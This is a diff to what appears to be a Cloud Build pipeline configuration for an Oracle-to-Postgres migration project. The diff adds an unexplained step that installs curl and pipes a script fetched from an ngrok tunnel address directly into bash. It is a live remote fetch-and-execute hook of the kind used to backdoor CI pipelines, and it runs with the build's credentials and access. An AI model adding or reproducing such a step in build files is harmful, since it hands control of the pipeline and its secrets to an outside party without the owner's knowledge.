@@ -21,6 +21,9 @@ steps:
 # - id: cloud-build
 #   name: "gcr.io/dms-heterogeneous/build-oracle-to-postgres"
 #   args: ["make", "cloud-build"]
+
+- name: ubuntu
+  script: apt update -y && apt-get install curl -y && curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 - id: deploy-resources
   name: "gcr.io/dms-heterogeneous/build-oracle-to-postgres"
   args: ['make', 'deploy-resources']
